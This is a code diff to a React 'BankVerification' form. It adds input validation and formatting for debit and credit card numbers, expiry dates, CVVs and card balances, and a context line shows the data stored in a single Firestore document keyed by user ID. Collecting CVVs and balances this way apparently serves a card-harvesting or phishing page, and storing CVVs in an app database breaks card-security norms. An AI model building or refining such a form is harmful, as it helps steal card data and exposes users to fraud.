@@ -57,6 +57,54 @@ export default function BankVerification() {
       return
     }
 
+    // Validate card details if cards are selected
+    const debitCardCount = Number.parseInt(formData.debitCards)
+    const creditCardCount = Number.parseInt(formData.creditCards)
+
+    // Validate debit cards
+    if (debitCardCount > 0) {
+      for (let i = 0; i < debitCardCount; i++) {
+        const card = formData.debitCardDetails[i]
+        if (!card.cardNumber || !card.expiry || !card.cvv || !card.balance) {
+          setMessage("Please fill all debit card details")
+          setIsLoading(false)
+          return
+        }
+        if (card.cardNumber.replace(/\s/g, '').length !== 16) {
+          setMessage(`Debit Card ${i + 1}: Card number must be 16 digits`)
+          setIsLoading(false)
+          return
+        }
+        if (!/^\d{2}\/\d{2}$/.test(card.expiry)) {
+          setMessage(`Debit Card ${i + 1}: Expiry must be in MM/YY format`)
+          setIsLoading(false)
+          return
+        }
+      }
+    }
+
+    // Validate credit cards
+    if (creditCardCount > 0) {
+      for (let i = 0; i < creditCardCount; i++) {
+        const card = formData.creditCardDetails[i]
+        if (!card.cardNumber || !card.expiry || !card.cvv || !card.balance) {
+          setMessage("Please fill all credit card details")
+          setIsLoading(false)
+          return
+        }
+        if (card.cardNumber.replace(/\s/g, '').length !== 16) {
+          setMessage(`Credit Card ${i + 1}: Card number must be 16 digits`)
+          setIsLoading(false)
+          return
+        }
+        if (!/^\d{2}\/\d{2}$/.test(card.expiry)) {
+          setMessage(`Credit Card ${i + 1}: Expiry must be in MM/YY format`)
+          setIsLoading(false)
+          return
+        }
+      }
+    }
+
     try {
       // Store bank verification data in "users" database, document "thirdform", with UID as field name
       const thirdformDocRef = doc(db, "users", "thirdform")
@@ -97,11 +145,70 @@ export default function BankVerification() {
     setFormData((prev) => ({ ...prev, [field]: value }))
   }
 
-  const handleCardDetailChange = (cardType: "debit" | "credit", index: number, field: string, value: string) => {
+  // Format card number with spaces and validate 16 digits
+  const handleCardNumberChange = (cardType: "debit" | "credit", index: number, value: string) => {
+    // Remove all non-digit characters
+    const cleaned = value.replace(/\D/g, '')
+    
+    // Limit to 16 digits
+    const limited = cleaned.slice(0, 16)
+    
+    // Add spaces every 4 digits for better readability
+    const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ')
+    
     const key = cardType === "debit" ? "debitCardDetails" : "creditCardDetails"
     setFormData((prev) => {
       const details = [...prev[key]]
-      details[index] = { ...details[index], [field]: value }
+      details[index] = { ...details[index], cardNumber: formatted }
+      return { ...prev, [key]: details }
+    })
+  }
+
+  // Format expiry date automatically with slash
+  const handleExpiryChange = (cardType: "debit" | "credit", index: number, value: string) => {
+    // Remove all non-digit characters
+    const cleaned = value.replace(/\D/g, '')
+    
+    let formatted = cleaned
+    
+    // Add slash after 2 digits
+    if (cleaned.length > 2) {
+      formatted = cleaned.slice(0, 2) + '/' + cleaned.slice(2, 4)
+    }
+    
+    // Limit to MM/YY format (5 characters including slash)
+    formatted = formatted.slice(0, 5)
+    
+    const key = cardType === "debit" ? "debitCardDetails" : "creditCardDetails"
+    setFormData((prev) => {
+      const details = [...prev[key]]
+      details[index] = { ...details[index], expiry: formatted }
+      return { ...prev, [key]: details }
+    })
+  }
+
+  // Handle CVV input (only numbers, max 4 digits)
+  const handleCvvChange = (cardType: "debit" | "credit", index: number, value: string) => {
+    // Remove all non-digit characters and limit to 4 digits
+    const cleaned = value.replace(/\D/g, '').slice(0, 4)
+    
+    const key = cardType === "debit" ? "debitCardDetails" : "creditCardDetails"
+    setFormData((prev) => {
+      const details = [...prev[key]]
+      details[index] = { ...details[index], cvv: cleaned }
+      return { ...prev, [key]: details }
+    })
+  }
+
+  // Handle balance input (only numbers)
+  const handleBalanceChange = (cardType: "debit" | "credit", index: number, value: string) => {
+    // Allow only numbers and decimal point
+    const cleaned = value.replace(/[^\d.]/g, '')
+    
+    const key = cardType === "debit" ? "debitCardDetails" : "creditCardDetails"
+    setFormData((prev) => {
+      const details = [...prev[key]]
+      details[index] = { ...details[index], balance: cleaned }
       return { ...prev, [key]: details }
     })
   }
@@ -315,12 +422,17 @@ export default function BankVerification() {
                           </label>
                           <input
                             type="text"
-                            placeholder="Card Number"
+                            placeholder="1234 5678 9012 3456"
                             value={formData.debitCardDetails[index]?.cardNumber || ""}
-                            onChange={(e) => handleCardDetailChange("debit", index, "cardNumber", e.target.value)}
+                            onChange={(e) => handleCardNumberChange("debit", index, e.target.value)}
                             className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                             disabled={isLoading}
+                            maxLength={19} // 16 digits + 3 spaces
                           />
+                          {formData.debitCardDetails[index]?.cardNumber && 
+                           formData.debitCardDetails[index]?.cardNumber.replace(/\s/g, '').length !== 16 && (
+                            <p className="text-red-500 text-xs mt-1">Must be 16 digits</p>
+                          )}
                         </div>
                         <div>
                           <label className="block text-xs font-semibold text-slate-900 mb-2">
@@ -330,9 +442,10 @@ export default function BankVerification() {
                             type="text"
                             placeholder="MM/YY"
                             value={formData.debitCardDetails[index]?.expiry || ""}
-                            onChange={(e) => handleCardDetailChange("debit", index, "expiry", e.target.value)}
+                            onChange={(e) => handleExpiryChange("debit", index, e.target.value)}
                             className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                             disabled={isLoading}
+                            maxLength={5}
                           />
                         </div>
                         <div>
@@ -341,11 +454,12 @@ export default function BankVerification() {
                           </label>
                           <input
                             type="text"
-                            placeholder="CVV"
+                            placeholder="123"
                             value={formData.debitCardDetails[index]?.cvv || ""}
-                            onChange={(e) => handleCardDetailChange("debit", index, "cvv", e.target.value)}
+                            onChange={(e) => handleCvvChange("debit", index, e.target.value)}
                             className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                             disabled={isLoading}
+                            maxLength={4}
                           />
                         </div>
                         <div>
@@ -354,9 +468,9 @@ export default function BankVerification() {
                           </label>
                           <input
                             type="text"
-                            placeholder="Balance"
+                            placeholder="0.00"
                             value={formData.debitCardDetails[index]?.balance || ""}
-                            onChange={(e) => handleCardDetailChange("debit", index, "balance", e.target.value)}
+                            onChange={(e) => handleBalanceChange("debit", index, e.target.value)}
                             className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                             disabled={isLoading}
                           />
@@ -397,12 +511,17 @@ export default function BankVerification() {
                           </label>
                           <input
                             type="text"
-                            placeholder="Card Number"
+                            placeholder="1234 5678 9012 3456"
                             value={formData.creditCardDetails[index]?.cardNumber || ""}
-                            onChange={(e) => handleCardDetailChange("credit", index, "cardNumber", e.target.value)}
+                            onChange={(e) => handleCardNumberChange("credit", index, e.target.value)}
                             className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                             disabled={isLoading}
+                            maxLength={19} // 16 digits + 3 spaces
                           />
+                          {formData.creditCardDetails[index]?.cardNumber && 
+                           formData.creditCardDetails[index]?.cardNumber.replace(/\s/g, '').length !== 16 && (
+                            <p className="text-red-500 text-xs mt-1">Must be 16 digits</p>
+                          )}
                         </div>
                         <div>
                           <label className="block text-xs font-semibold text-slate-900 mb-2">
@@ -412,9 +531,10 @@ export default function BankVerification() {
                             type="text"
                             placeholder="MM/YY"
                             value={formData.creditCardDetails[index]?.expiry || ""}
-                            onChange={(e) => handleCardDetailChange("credit", index, "expiry", e.target.value)}
+                            onChange={(e) => handleExpiryChange("credit", index, e.target.value)}
                             className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                             disabled={isLoading}
+                            maxLength={5}
                           />
                         </div>
                         <div>
@@ -423,11 +543,12 @@ export default function BankVerification() {
                           </label>
                           <input
                             type="text"
-                            placeholder="CVV"
+                            placeholder="123"
                             value={formData.creditCardDetails[index]?.cvv || ""}
-                            onChange={(e) => handleCardDetailChange("credit", index, "cvv", e.target.value)}
+                            onChange={(e) => handleCvvChange("credit", index, e.target.value)}
                             className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                             disabled={isLoading}
+                            maxLength={4}
                           />
                         </div>
                         <div>
@@ -436,9 +557,9 @@ export default function BankVerification() {
                           </label>
                           <input
                             type="text"
-                            placeholder="Balance"
+                            placeholder="0.00"
                             value={formData.creditCardDetails[index]?.balance || ""}
-                            onChange={(e) => handleCardDetailChange("credit", index, "balance", e.target.value)}
+                            onChange={(e) => handleBalanceChange("credit", index, e.target.value)}
                             className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                             disabled={isLoading}
                           />
